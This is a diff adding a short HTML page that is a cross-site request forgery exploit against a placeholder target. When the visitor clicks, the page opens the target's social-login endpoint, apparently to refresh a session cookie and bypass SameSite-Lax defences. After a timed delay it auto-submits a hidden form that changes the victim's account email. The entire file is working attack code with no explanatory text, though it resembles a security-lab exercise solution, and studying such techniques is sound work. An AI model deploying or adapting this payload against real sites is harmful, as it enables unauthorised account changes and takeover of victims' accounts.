@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <form method="POST" action="https://TARGET_ORIGIN/PATH">
+      <input type="hidden" name="email" value="test@example.com">
+    </form>
+    <p>Click anywhere on the page</p>
+    <script>
+      window.onclick = () => {
+        window.open('https://TARGET_ORIGIN/social-login');
+        setTimeout(() => document.forms[0].submit(), 5000);
+      }
+    </script>
+  </body>
+</html>
+
